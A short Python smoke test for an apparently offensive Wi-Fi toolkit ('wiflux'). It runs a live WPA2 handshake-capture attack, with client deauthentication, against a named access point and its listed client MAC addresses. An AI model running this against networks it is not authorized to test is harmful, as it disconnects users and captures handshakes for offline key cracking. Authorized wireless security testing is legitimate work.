#!/usr/bin/env python3
"""Live handshake capture smoke test."""

from __future__ import annotations

import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from wiflux.config import WifluxConfig
from wiflux.models import AccessPoint, Client, EncryptionType
from wiflux.attacks.handshake import HandshakeAttack
from wiflux.progress import ProgressTracker
from wiflux.tools.interface import recover_interface


def main() -> int:
    ap = AccessPoint(
        bssid="92:B4:74:3A:F1:92",
        channel=44,
        encryption=EncryptionType.WPA2,
        auth="PSK",
        power=79,
        essid="Yaxley 5ghz",
        essid_known=True,
        clients=[
            Client(station="FE:32:E8:12:1E:0A", power=-42),
            Client(station="52:71:26:1D:A5:68", power=-90),
        ],
    )

    cfg = WifluxConfig()
    cfg.scan.interface = recover_interface("wlan0mon", ap.channel)
    cfg.attack.handshake = True
    cfg.attack.pmkid = False
    cfg.attack.wpa_timeout = 120
    cfg.attack.deauth_listen = 12
    cfg.attack.new_handshake = True
    cfg.attack.skip_crack = True
    cfg.output.quiet = True

    attack = HandshakeAttack(cfg, ap, ProgressTracker())
    print(f"Target: {ap.essid} {ap.bssid} ch{ap.channel}")
    t0 = time.time()
    result = attack.run()
    print(f"success={result.success} ({time.time()-t0:.0f}s) {result.message}")
    return 0 if result.success else 1


if __name__ == "__main__":
    raise SystemExit(main())